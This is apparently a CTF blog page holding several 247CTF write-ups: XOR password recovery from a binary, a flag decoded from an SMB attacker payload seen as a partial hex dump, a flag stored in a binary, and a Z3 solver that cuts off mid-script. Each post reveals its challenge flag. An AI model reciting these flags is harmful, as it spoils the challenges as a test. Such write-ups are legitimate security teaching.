-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/247CTF/247CTF-the-encrypted-password/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="the-encrypted-password">The encrypted password</h1>
-<p>Challenge prompt:</p>
-<blockquote>
-<p>You won’t find the admin’s secret password in this binary. We even
-encrypted it with a secure one-time-pad. Can you still recover the
-password?</p>
-</blockquote>
-<h2 id="quick-dynamic-check-with-ltrace">1. Quick dynamic check with
-<code>ltrace</code></h2>
-<p><code>ltrace</code> shows the binary compares our input against a
-transformed string.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ltrace ./encrypted_password</span><br><span class="line">...</span><br><span class="line">puts(<span class="string">&quot;Enter the secret password:&quot;</span>)</span><br><span class="line">fgets(<span class="string">&quot;arst\\n&quot;</span>, 33, stdin)</span><br><span class="line">strcmp(<span class="string">&quot;arst\\n&quot;</span>, <span class="string">&quot;141c85ccfb2ae19d8d8c224c4e403dce&quot;</span>...)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-<p>This already hints that the expected secret is a printable 32-byte
-string.</p>
-<h2 id="or-debug-in-debugger-pwndbg">2. Or debug in debugger
-(<code>pwndbg</code>)</h2>
-<p>Set a breakpoint at the <code>strcmp</code> call
-(<code>0x555555400930</code>) and run the program.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b *0x555555400930</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">...</span><br><span class="line">► 0x555555400930    call   strcmp@plt</span><br><span class="line">    s1: 0x7fffffffdf00 ◂— 0x500000000a</span><br><span class="line">    s2: 0x7fffffffded0 ◂— <span class="string">&#x27;141c85ccfb2ae19d8d8c224c4e403dce&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>At compare time, <code>s2</code> contains the final password
-candidate.</p>
-<h2 id="or-reverse-logic-in-ida">3. Or reverse logic in IDA</h2>
-<p>Relevant decompiled logic:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strcpy</span>(s, <span class="string">&quot;875e9409f9811ba8560beee6fb0c77d2&quot;</span>);</span><br><span class="line">*(_QWORD *)s2 = <span class="number">0x5A53010106040309L</span>L;</span><br><span class="line">v8  = <span class="number">0x5C585354500A5B00L</span>L;</span><br><span class="line">v9  = <span class="number">0x555157570108520DL</span>L;</span><br><span class="line">v10 = <span class="number">0x5707530453040752L</span>L;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(s); ++i)</span><br><span class="line">  s2[i] ^= s[i];</span><br><span class="line"></span><br><span class="line">fgets(s1, <span class="number">33</span>, <span class="built_in">stdin</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">strcmp</span>(s1, s2))</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You found the flag!\\n247CTF&#123;%s&#125;\\n&quot;</span>, s2);</span><br></pre></td></tr></table></figure>
-<p>So the binary builds <code>s2</code>, XORs it with <code>s</code>,
-then compares it against input.</p>
-<p>Reconstruct the secret with Python</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p64, xor</span><br><span class="line"></span><br><span class="line">chunks = [</span><br><span class="line">    <span class="number">0x5A53010106040309</span>,</span><br><span class="line">    <span class="number">0x5C585354500A5B00</span>,</span><br><span class="line">    <span class="number">0x555157570108520D</span>,</span><br><span class="line">    <span class="number">0x5707530453040752</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">s2_bytes = <span class="string">b&quot;&quot;</span>.join(p64(chunk) <span class="keyword">for</span> chunk <span class="keyword">in</span> chunks)</span><br><span class="line">key = <span class="string">b&quot;875e9409f9811ba8560beee6fb0c77d2&quot;</span></span><br><span class="line">password = xor(s2_bytes, key)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;247CTF&#123;&#123;<span class="subst">&#123;password.decode()&#125;</span>&#125;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>
-<h2 id="flag">Flag</h2>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">247CTF{141c85ccfb2ae19d8d8c224c4e403dce}</span></span>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/247CTF/247CTF-commutative-payload/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/247CTF/247CTF-commutative-payload/" class="post-title-link" itemprop="url">247CTF - Commutative Payload</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2026-03-01 16:03:44" itemprop="dateCreated datePublished" datetime="2026-03-01T16:03:44+08:00">2026-03-01</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-03-06 14:01:32" itemprop="dateModified" datetime="2026-03-06T14:01:32+08:00">2026-03-06</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/247CTF/247CTF-commutative-payload/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/247CTF/247CTF-commutative-payload/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>We have a honey pot running on one of our internal networks. We
-received an alert today that the machine was compromised, but we can’t
-figure out what the attacker did. Can you find the flag hidden in the
-attacker’s payload?</p>
-<p>我们在内部网络中运行了一个蜜罐。今天我们收到警报，显示该机器已被入侵，但我们无法确定攻击者做了什么。你能找到隐藏在攻击者有效载荷中的
-flag 吗？</p>
-<h3 id="network-traffic">Network Traffic</h3>
-<p>The provided logs show SMB (Server Message Block) traffic on port 445
-(<code>microsoft_ds</code>). The sequence of
-<code>SMBNegotiate_Request</code> and
-<code>SMB2_Negotiate_Protocol_Request</code> suggests an attempt to
-exploit an SMB vulnerability.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0001 Ether / IP / TCP 192.168.10.168:microsoft_ds &gt; 10.0.5.15:42799 SA / Padding</span><br><span class="line">0003 Ether / IP / TCP 10.0.5.15:42799 &gt; 192.168.10.168:microsoft_ds PA / NBTSession / SMB_Header / SMBNegotiate_Request</span><br><span class="line">...</span><br><span class="line">0203 Ether / IP / TCP 10.0.5.15:43947 &gt; 192.168.10.168:microsoft_ds PA / NBTSession / SMB2_Header / SMB2_Negotiate_Protocol_Request / Raw</span><br></pre></td></tr></table></figure>
-<h3 id="payload-extraction">Payload Extraction</h3>
-<p>Following the TCP stream and exporting the raw data with Wireshark,
-we get the following hex dump:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">❯ xxd a.raw</span><br><span class="line">...</span><br><span class="line">00000270: 0031 c941 e201 c3b9 8200 00c0 0f32 48bb  .1.A........2H..</span><br><span class="line">00000280: f80f d0ff ffff ffff 8953 0489 0348 8d05  .........S...H..</span><br><span class="line">00000290: 0a00 0000 4889 c248 c1ea 200f 30c3 0f01  ....H..H.. .0...</span><br><span class="line">000002a0: f865 4889 2425 1000 0000 6548 8b24 25a8  .eH.$%....eH.$%.</span><br><span class="line">...</span><br><span class="line">000007c0: 4d55 9dce ebc1 2620 2357 4052 6f23 7627  MU....&amp; <span class="comment">#W@Ro#v&#x27;</span></span><br><span class="line">000007d0: 2226 2277 7027 2122 232c 2075 2523 752d  <span class="string">&quot;&amp;&quot;</span>wp<span class="string">&#x27;!&quot;#, u%#u-</span></span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure>
-<p>The challenge name <strong>“Commutative Payload”</strong> hints at a
-commutative operation like XOR used for obfuscation.</p>
-<h2 id="solution">Solution</h2>
-<ol type="1">
-<li><strong>Extract Data</strong>: Save the raw payload from the
-Wireshark TCP stream.</li>
-<li><strong>CyberChef Analysis</strong>:
-<ul>
-<li>Use the <strong>XOR Brute Force</strong> operation.</li>
-<li><strong>Sample length</strong>: 10000.</li>
-<li><strong>Crib</strong>: <code>247CTF</code> (knowing the flag
-format).</li>
-</ul></li>
-<li><strong>Identification</strong>: When testing a key length of 2, the
-key <code>14 14</code> (effectively a 1-byte XOR with <code>0x14</code>)
-decrypts the payload to reveal the flag.</li>
-</ol>
-<h2 id="flag">Flag</h2>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">247CTF{7b3626cd356784a17a9e49447356f229}</span></span>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/247CTF/247CTF-the-more-the-merrier/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/247CTF/247CTF-the-more-the-merrier/" class="post-title-link" itemprop="url">247CTF - The More The Merrier</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2026-03-01 16:03:44" itemprop="dateCreated datePublished" datetime="2026-03-01T16:03:44+08:00">2026-03-01</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-03-06 14:01:32" itemprop="dateModified" datetime="2026-03-06T14:01:32+08:00">2026-03-06</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/247CTF/247CTF-the-more-the-merrier/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/247CTF/247CTF-the-more-the-merrier/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="the-more-the-merrier">The More The Merrier</h1>
-<p>One byte is great. But what if you need more? Can you find the flag
-hidden in this binary?</p>
-<h2 id="analysis">Analysis</h2>
-<p>The challenge provides a 64-bit ELF executable. Checking its
-details:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">❯ file the_more_the_merrier</span><br><span class="line">the_more_the_merrier: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=0f750d638337391328fa7432dd362189de908c1e, stripped</span><br></pre></td></tr></table></figure>
-<p>Upon inspecting the binary’s data section or its hex dump, we find
-the 247CTF flag hidden in the binary:</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">00000000000006E0  01 00 02 00 00 00 00 00  32 00 00 00 34 00 00 00  ........2...4...</span><br><span class="line">00000000000006F0  37 00 00 00 43 00 00 00  54 00 00 00 46 00 00 00  7...C...T...F...</span><br><span class="line">0000000000000700  7B 00 00 00 36 00 00 00  64 00 00 00 66 00 00 00  &#123;...6...d...f...</span><br><span class="line">0000000000000710  32 00 00 00 31 00 00 00  35 00 00 00 65 00 00 00  2...1...5...e...</span><br><span class="line">0000000000000720  62 00 00 00 33 00 00 00  63 00 00 00 63 00 00 00  b...3...c...c...</span><br><span class="line">0000000000000730  37 00 00 00 33 00 00 00  34 00 00 00 30 00 00 00  7...3...4...0...</span><br><span class="line">0000000000000740  37 00 00 00 32 00 00 00  36 00 00 00 37 00 00 00  7...2...6...7...</span><br><span class="line">0000000000000750  30 00 00 00 33 00 00 00  31 00 00 00 61 00 00 00  0...3...1...a...</span><br><span class="line">0000000000000760  31 00 00 00 35 00 00 00  62 00 00 00 30 00 00 00  1...5...b...0...</span><br><span class="line">0000000000000770  61 00 00 00 62 00 00 00  33 00 00 00 36 00 00 00  a...b...3...6...</span><br><span class="line">0000000000000780  63 00 00 00 7D 00 00 00  00 00 00 00 4E 6F 74 68  c...&#125;.......Noth</span><br></pre></td></tr></table></figure>
-<h2 id="solution">Solution</h2>
-<p>Each character of the flag is stored as a 4-byte little-endian
-integer. For example: - <code>32 00 00 00</code> -&gt; <code>0x32</code>
--&gt; <code>'2'</code> - <code>34 00 00 00</code> -&gt;
-<code>0x34</code> -&gt; <code>'4'</code> - <code>37 00 00 00</code>
--&gt; <code>0x37</code> -&gt; <code>'7'</code> -
-<code>43 00 00 00</code> -&gt; <code>0x43</code> -&gt;
-<code>'C'</code></p>
-<p>We can extract the flag by reading the first byte of each 4-byte
-chunk.</p>
-<h2 id="flag">Flag</h2>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">247CTF{6df215eb3cc73407267031a15b0ab36c}</span></span>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/247CTF/247CTF-the-secret-lock/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/247CTF/247CTF-the-secret-lock/" class="post-title-link" itemprop="url">247CTF - The Secret Lock</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2026-03-01 16:03:44" itemprop="dateCreated datePublished" datetime="2026-03-01T16:03:44+08:00">2026-03-01</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-03-06 14:01:32" itemprop="dateModified" datetime="2026-03-06T14:01:32+08:00">2026-03-06</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/247CTF/247CTF-the-secret-lock/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/247CTF/247CTF-the-secret-lock/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>Reverse the lock validation logic and recover the 40-character
-flag.</p>
-<h2 id="challenge">Challenge</h2>
-<p>The page verifies a candidate flag client-side with a long chain of
-arithmetic and bitwise constraints.</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">        checkFlag(flag) &#123;</span><br><span class="line">          let result = &quot;LOCKED&quot;;</span><br><span class="line">          this.dom.lock.classList.remove(&quot;verified&quot;);</span><br><span class="line">          if (</span><br><span class="line">            Object.keys(flag).length == 40 &amp;&amp;</span><br><span class="line">            (flag[37] - flag[37]) * flag[15] == 0 &amp;&amp;</span><br><span class="line">            (flag[3] + flag[31]) ^ (flag[29] + flag[8] == 234) &amp;&amp;</span><br><span class="line"></span><br><span class="line">// Constraint Satisfaction</span><br><span class="line"></span><br><span class="line">          ) &#123;</span><br><span class="line">            result = &quot;&quot;;</span><br><span class="line">            for (var idx in flag) &#123;</span><br><span class="line">              result += String.fromCharCode(flag[idx]);</span><br><span class="line">            &#125;</span><br><span class="line">            this.dom.lock.classList.add(&quot;verified&quot;);</span><br><span class="line">          &#125;</span><br><span class="line">          return result;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<h2 id="approach">Approach</h2>
-<ul>
-<li>Extract all <code>if (...)</code> constraints from the JavaScript
-checker.</li>
-<li>Model each <code>flag[i]</code> as an ASCII character in Z3
-(<code>32..126</code>).</li>
-<li>Convert JavaScript-style constraint expressions into valid Python/Z3
-expressions.</li>
-<li>Solve and rebuild the flag string from the model.</li>
-</ul>
-<h2 id="solver-script-z3">Solver Script (Z3)</h2>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> BitVec, Solver, sat</span><br><span class="line"></span><br><span class="line">raw_js = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">(flag[37] - flag[37]) * flag[15] == 0 &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[3] + flag[31]) ^ (flag[29] + flag[8] == 234) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[32] - flag[12]) * flag[9] == -2332 &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[24] - flag[27] + flag[13]) ^ (flag[6] == 114) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[38] - flag[15]) * flag[33] == 800 &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[34] - flag[21]) * flag[26] == 98 &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[29] + flag[0]) ^ (flag[8] + flag[38] == 248) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[21] * flag[18]) ^ (flag[7] - flag[15] == 2694) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[28] * flag[23]) ^ (flag[19] - flag[5] == -9813) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[34] + flag[30]) ^ (flag[37] + flag[6] == 72) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[23] - flag[22]) * flag[12] == 4950 &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[9] * flag[28]) ^ (flag[20] - flag[11] == 5143) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[2] * flag[22]) ^ (flag[37] - flag[0] == 2759) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[26] - flag[12]) * flag[3] == -3350 &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[35] * flag[0]) ^ (flag[23] - flag[21] == 2698) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[20] + flag[31]) ^ (flag[5] + flag[10] == 22) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[31] * flag[19]) ^ (flag[1] - flag[2] == -2655) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[38] - flag[14]) * flag[18] == 55 &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[29] - flag[19] + flag[10]) ^ (flag[2] == 93) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[13] - flag[25] + flag[30]) ^ (flag[29] == 13) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[35] + flag[33]) ^ (flag[26] + flag[21] == 249) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[17] + flag[24]) ^ (flag[34] + flag[1] == 253) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[32] - flag[35] + flag[19]) ^ (flag[1] == 0) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[22] - flag[11] + flag[3]) ^ (flag[31] == 113) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[19] - flag[0]) * flag[13] == 108 &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[19] - flag[17]) * flag[14] == -2475 &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[31] - flag[35] + flag[16]) ^ (flag[19] == 84) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[24] * flag[27]) ^ (flag[35] - flag[17] == -5792) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[11] * flag[35]) ^ (flag[15] - flag[28] == -2845) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[18] - flag[19] + flag[31]) ^ (flag[5] == 112) &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[20] - flag[6]) * flag[10] == -3933 &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[39] - flag[33]) * flag[6] == 3075 &amp;&amp;</span></span><br><span class="line"><span class="string">(flag[22] + flag[1]) ^ (flag[39] + flag[14] == 211) &amp;&amp;</span></span><br><span class="line"><span 